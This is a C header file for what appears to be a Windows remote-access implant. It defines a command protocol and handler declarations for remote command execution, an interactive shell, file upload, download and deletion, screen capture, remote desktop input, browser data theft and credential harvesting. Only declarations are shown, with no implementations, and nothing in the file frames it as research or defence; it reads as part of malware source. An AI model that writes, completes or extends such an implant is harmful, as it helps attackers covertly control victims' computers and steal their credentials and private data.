#ifndef IMPLANT_H
#define IMPLANT_H

#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>

#define MAGIC0 0xA1
#define MAGIC1 0xB7
#define CMD_PING 0x01
#define CMD_EXEC 0x02
#define CMD_QUIT 0x03
#define CMD_REGISTER 0x10
#define CMD_HEARTBEAT 0x11
#define CMD_FS_LS 0x20
#define CMD_FS_GET 0x21
#define CMD_SCREEN 0x22
#define CMD_DESK_ON 0x23
#define CMD_DESK_OFF 0x24
#define CMD_INPUT 0x25
#define CMD_SHELL_ON 0x26
#define CMD_SHELL_IN 0x27
#define CMD_SHELL_OFF 0x28
#define CMD_FS_PUT 0x29
#define CMD_FS_DEL 0x2A
#define CMD_FS_MKDIR 0x2B
#define CMD_FS_REN 0x2C
#define CMD_BROWSER 0x2D
#define CMD_CREDS 0x2E
#define CMD_BROWSER_DEEP 0x2F
#define RSP_DATA 0x81
#define RSP_ERR 0x82
#define RSP_END 0x83
#define RSP_SHELL 0x84
#define RSP_FRAME 0x85
#define RSP_OK 0x90
#define BUF_SZ 2097152
#define CHUNK 60000

int send_frame(SOCKET s, unsigned short type, const unsigned char* payload, int plen);
int send_blob(SOCKET s, const unsigned char* p, int n);
int send_err(SOCKET s, const char* msg);
void handle_fs_ls(SOCKET s, const char* path);
void handle_fs_get(SOCKET s, const char* path);
void handle_fs_put(SOCKET s, const unsigned char* p, int n);
void handle_fs_del(SOCKET s, const char* path);
void handle_fs_mkdir(SOCKET s, const char* path);
void handle_fs_ren(SOCKET s, const char* spec);
void handle_screen(SOCKET s, int max_w, int quality, int send_end);
void handle_input(const unsigned char* p, int n);
void handle_browser(SOCKET s);

#endif
